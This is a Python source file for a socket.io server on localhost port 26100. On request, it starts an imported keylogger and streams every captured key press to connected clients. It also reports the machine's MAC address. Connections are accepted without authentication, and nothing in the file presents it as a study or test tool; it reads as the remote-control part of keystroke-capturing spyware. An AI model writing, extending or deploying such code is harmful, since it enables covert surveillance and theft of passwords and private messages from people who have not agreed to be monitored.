import socketio
from getmac import get_mac_address 
from keylogger import KeyLogger
import eventlet
import threading

def create_socket_server():
    sio = socketio.Server(always_connect = True)
    app = socketio.WSGIApp(sio)
    
    return sio, app

class SocketServer:
    def __init__(self, host, port):
        self.sio, self.app = create_socket_server()
        self.host = host
        self.port = port
        self.keylogger = None
        self.__block = threading.Lock()
        self.init_event_handler()
        
    def init_event_handler(self):
        self.sio.on('connect', self.__connect_handler)
        self.sio.on('disconnect', self.__disconnect_handler)
        self.sio.on('request_mac', self.__request_mac_handler)
        self.sio.on('request_keyhook', self.__request_keyhook_handler)
        
    def on_key_press_listener(self, key):
        self.sio.emit('receive_key', str(key))
        
    def __connect_handler(self, sid, environ):
        print("connect ", sid)
        
    def __disconnect_handler(self, sid):
        print('disconnect ', sid)
        
    def __request_keyhook_handler(self, sid):
        if not self.keylogger:
            self.keylogger = KeyLogger()
            self.keylogger.on_key_press_listener = self.on_key_press_listener
            self.keylogger.start()
        else:
            self.keylogger.stop()
            self.keylogger = None

    def __request_mac_handler(self, sid):
        self.sio.emit('receive_mac', str(get_mac_address()))
    
    def run_server(self):
        eventlet.wsgi.server(eventlet.listen((self.host, self.port)), self.app)
    
HOST = '127.0.0.1'
PORT = 26100
server_socket = SocketServer(HOST, PORT)
server_socket.run_server()
